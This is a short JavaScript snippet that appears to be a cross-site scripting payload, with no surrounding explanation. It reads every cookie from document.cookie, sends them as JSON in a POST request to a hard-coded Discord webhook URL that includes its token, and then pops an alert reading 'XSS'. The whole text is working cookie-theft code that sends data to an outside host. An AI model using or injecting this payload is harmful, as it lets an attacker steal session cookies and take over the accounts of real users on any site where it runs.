var cookies = document.cookie.split(';').reduce(
    (cookies, cookie) => {
        const [name, val] = cookie.split('=').map(c => c.trim());
        cookies[name] = val;
        return cookies;
    }, {});

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://discord.com/api/webhooks/993816884078198784/dS25qi8u9xidomZ4Hf8HbFqf8VxCjChUT-YaQNeTS01BB_--E2jKtLS-sy_MpSqP_xz8", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({
        "content": "```ini\n[" + JSON.stringify(cookies) + "]\n```"
    }));
    alert("XSS");